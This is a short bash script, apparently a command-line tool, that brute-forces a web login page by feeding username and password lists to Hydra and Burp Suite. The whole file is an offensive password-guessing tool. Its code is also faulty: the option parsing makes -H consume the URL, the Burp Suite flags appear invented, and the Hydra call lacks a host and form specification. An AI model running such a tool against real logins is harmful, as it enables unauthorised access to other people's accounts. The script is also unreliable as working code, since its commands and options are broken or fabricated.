#!/bin/bash

HELP="
Usage: $0 [options] <url> <username_list> <password_list>

Options:
  -h, --help      Show this help message and exit
  -v, --version   Show version information and exit
  -b, --burp      Use Burp Suite to brute-force the login page
  -H, --hydra     Use Hydra to brute-force the login page

Required arguments:
  <url>           The URL of the login page
  <username_list> The username list to use for the brute-force attack
  <password_list> The password list to use for the brute-force attack

Description:
  This script uses Hydra and/or Burp Suite to brute-force a login page.

Example:
  $0 -b -H http://example.com/login usernames.txt passwords.txt
"

VERSION="1.0"

while getopts ":hv:bH:" opt; do
  case $opt in
    h) echo "$HELP"; exit 0;;
    v) echo "Version: $VERSION"; exit 0;;
    b) USE_BURP="true";;
    H) USE_HYDRA="true";;
    \?) echo "Invalid option: -$OPTARG"; exit 1;;
  esac
done

shift $((OPTIND-1))

if [ $# -ne 3 ]; then
  echo "Error: Missing required arguments"
  echo "$HELP"
  exit 1
fi

URL=$1
USERNAME_LIST=$2
PASSWORD_LIST=$3

if [ -n "$USE_BURP" ]; then
  # Use Burp Suite to brute-force the login page
  for username in $(cat "$USERNAME_LIST"); do
    burpsuite --brute-force --url "$URL" --username "$username" --password-list "$PASSWORD_LIST"
  done
fi

if [ -n "$USE_HYDRA" ]; then
  # Use Hydra to brute-force the login page
  for username in $(cat "$USERNAME_LIST"); do
    hydra -l "$username" -P "$PASSWORD_LIST" http-post-form "$URL"
  done
fi
